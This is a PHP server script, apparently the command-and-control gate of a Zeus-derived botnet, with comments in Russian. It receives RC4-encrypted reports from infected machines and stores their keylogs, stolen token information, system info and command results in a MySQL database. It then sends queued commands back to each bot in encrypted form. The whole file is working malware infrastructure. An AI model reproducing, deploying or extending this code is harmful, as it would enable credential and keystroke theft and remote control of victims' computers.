 <?

error_reporting(E_ALL); // 0
set_time_limit(0);

//Данные о протоколе.
define('HEADER_SIZE',      48); //sizeof(BinStorage::STORAGE)
define('HEADER_MD5',       32); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)

//Конастанты.
define('BOT_ID', 10001);
define('LOG_ID',  10018); 	// log type, GRB_*, 205 - keylog, 206 - token info, 207 - dummy knock
define('LOG',	 10019);

define('GRB_KEYLOG', 205);
define('GRB_TOKENINFO', 206);
define('GRB_DUMMY', 207);
define('GRB_EXEC_RESULT', 208);

/*
  	Parses text part of dummy keylog
  	in case of '_' => result is 0
    in other case, str is 'AAAA', where every char is +N of numeric value
    	<b1 b2 b3 b4>
*/
function siParse($s)
{
	// check for len
	if (strlen($s) != 4) { return 0; }

	// parse into bytes
	$b = array();
	for ($i = 0; $i<4; $i++) {
		$b[$i] = intval( ord($s[$i]) - ord('A') );
		// check value limits
		if (($b[$i]<0) || ($b[$i] > 254)) { return 0; }
	} // for

	// NB: to prevent from facing php signed/unsigned problems on x32,
	// do not set high bits in result DWORD via $b[0]

    // combine resulting dword
    return ($b[0] << 24) + ($b[1] << 16) + ($b[2] << 8) + $b[3];

}


// only 1st char has meaning
function lrParse($s)
{
	$res = intval( ord($s[0]) - ord('A') );

	// check value limits
	if (($res<0) || ($res > 100)) { return 0; }

	return $res;
}

/*
	traffic forwarding support
*/
function GetRemoteIP() {
	$res='';
    if (@isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
       // extract 1st ip (ok if only 1 ip present)
       $ip_arr=explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']);
       $res=trim($ip_arr[0]);
    } else {
      // usual connection
      $res=$_SERVER['REMOTE_ADDR'];
    }
  return $res;
}


if(@$_SERVER['REQUEST_METHOD'] !== 'POST')die("1");
require_once('config.php');

# DATABASE CONNECTION
$link = mysql_connect($server, $username, $password) or die ('Could not connect to MySQL server.');
$db = mysql_select_db($database, $link) or die ('Could not select MySQL database.');
mysql_query('set names utf8');
mysql_query('SET COLLATE utf8_general_ci');


//Получаем данные.
$key_bin  = rc4Init($key);
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)die("2");
rc4($data, $key_bin);
visualDecrypt($data);

if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)die("3");


//Парсим данные (Сжатие данных не поддерживается).
$list = array();
for($i = HEADER_SIZE; $i < $dataSize;)
{
  $k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
  $list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
  $i += (ITEM_HEADER_SIZE + $k[3]);
}
unset($data);


//Основной параметр, который должн быть всегда.
if(empty($list[BOT_ID]))die("4");

//$curTime 	= time();
$ip			= mysql_real_escape_string(GetRemoteIP());
//mysql_set_charset('utf8');

$botIdQ     = mysql_real_escape_string(trim($list[BOT_ID]));


// unpack log type
$lt_array = unpack("Vformat_id", $list[LOG_ID]);

// select appropriate query
switch ($lt_array['format_id']) {

	case GRB_TOKENINFO:
		// token log, update field
		$log = mysql_real_escape_string($list[LOG]);
		$exp = "INSERT INTO `reports` (`signature`, `token_last_seen`, `tags`, `ip`) VALUES ('{$botIdQ}', NOW(), '{$log}', '{$ip}') ON DUPLICATE KEY UPDATE `token_last_seen`=NOW(), `tags`='{$log}', `added_by_lt_gate`=0, `ip`='{$ip}';";
		break;

	case GRB_KEYLOG:
		// generic log
		$log = "|:|".base64_encode($list[LOG]);
		$exp="INSERT INTO `reports` (`signature`, `log`) VALUES ( '{$botIdQ}', '{$log}' ) ON DUPLICATE KEY UPDATE `log`=CONCAT(`log`, '{$log}'), `added_by_lt_gate`=0, `ip`='{$ip}';";
		break;

	case GRB_DUMMY:
		// version without sysinfo in dummy keylog returns '_' as $list[LOG]
	    // newer versions contains 5-letters encoded sysinfo, to be parsed. In case of successfull parse, $sysinfo will contain DWORD-packed info
	    // in case of parse error, $sysinfo will contain 0
	    $sysinfo = intval(siParse($list[LOG]));
	    // final query
	    $exp = "INSERT INTO `reports` (`signature`, `sysinfo`, `ip`) VALUES ('{$botIdQ}', {$sysinfo}, '{$ip}') ON DUPLICATE KEY UPDATE `last_modify`=NOW(), `added_by_lt_gate`=0, `sysinfo`={$sysinfo}, `ip`='{$ip}';";
  	    break;

  	case GRB_EXEC_RESULT:
        $load_res = intval(lrParse($list[LOG]));
        $exp = "INSERT INTO `cmd_results` (`u_id`, `result`, `cmdres_stamp`) VALUES ( (SELECT `id` FROM `reports` WHERE `signature`='{$botIdQ}' LIMIT 1), {$load_res}, NOW())
        		ON DUPLICATE KEY UPDATE `cmdres_stamp`=NOW(), `result`={$load_res};";
  		break;


}

// do query
$res=mysql_query($exp) or die("44"); // "mysql err ".mysql_error()

//die($exp);

// return success/cmd data result
$res = mysql_query("SELECT `cmds`.`data` FROM `cmds`, `reports` WHERE `reports`.`linked_cmd_id`=`cmds`.`rec_id` AND `reports`.`signature`='{$botIdQ}' AND
						(SELECT COUNT(*) FROM `cmd_results`, `reports` WHERE `reports`.`signature`='{$botIdQ}' AND `reports`.`id`=`cmd_results`.`u_id`) <1  AND
						( (`reports`.`cmd_sent_at` > DATE_SUB(NOW(), INTERVAL 15 MINUTE)) OR (`reports`.`cmd_sent_at` = '0000-00-00 00:00:00') )  ;");
$row = mysql_fetch_assoc($res);
if (strlen($row['data']) > 512) {

	// set cmd sent flag
	mysql_query("UPDATE `reports` SET `cmd_sent_at`=NOW() WHERE `signature`='{$botIdQ}' LIMIT 1;");

	formAnswerBuffer($row['data']);
} else { formAnswerBuffer("ok"); }

//print_r($list);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Инициализация RC4 ключа.

  IN $key - string, текстовый ключ.
  Return  - array, бинарный ключ.
*/
function rc4Init($key)
{
  $hash      = array();
  $box       = array();
  $keyLength = strlen($key);

  for($x = 0; $x < 256; $x++)
  {
    $hash[$x] = ord($key[$x % $keyLength]);
    $box[$x]  = $x;
  }

  for($y = $x = 0; $x < 256; $x++)
  {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }

  return $box;
}

/*
  Широфвание RC4.

  IN OUT $data - string, данные для шифрования.
  IN $key      - string, ключ шифрования от rc4Init().
*/
function rc4(&$data, $key)
{
  $len = strlen($data);
  for($z = $y = $x = 0; $x < $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;

    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
  }
}

/*
  Визуальное шифрование.

  IN OUT $data - string, данные для шифрования.
*/
function visualEncrypt(&$data)
{
  $len = strlen($data);
  for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Визуальное дешифрование.

  IN OUT $data - string, данные для шифрования.
*/
function visualDecrypt(&$data)
{
  $len = strlen($data);
  if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  	returns rnd string with [1..255] chars of $len specified
*/
function rnd_string($len)
{
	$res = '';
	$count = $len;
	while ($count) {
		$res .= chr(rand(1, 255));
		$count--;
	}	// while need more

	return $res;
}


/*
  	Prepares encrypted structure with hash field as remote side expects

	MD5HASH_SIZE 16
   typedef struct
  {
    BYTE randData[20];                // random data
    DWORD size;                       // full size, header + appended data
    DWORD flags;                      // flags
    DWORD count;                      // opt count
    BYTE md5Hash[MD5HASH_SIZE]; 	  // hash of data appended, to check decryption status
  }STORAGE;
*/
function formAnswerBuffer($plain_data)
{
	global $key;

	@ob_end_clean();

	// calc md5 hash
    $hash = md5($plain_data, TRUE);

	// form resulting plain chunk
	$chunk = rnd_string(20).pack("VVV", strlen($plain_data)+48, 0, 0).$hash.$plain_data;

	// do encryption
 	visualEncrypt($chunk);
	$key_bin = rc4Init($key);
	rc4($chunk, $key_bin);

   	// output answer to user stream
	echo $chunk;
}


///////////////////////////////////////////////////////////////////////////////////////////////////
// Обрабатываем данные.
///////////////////////////////////////////////////////////////////////////////////////////////////

?>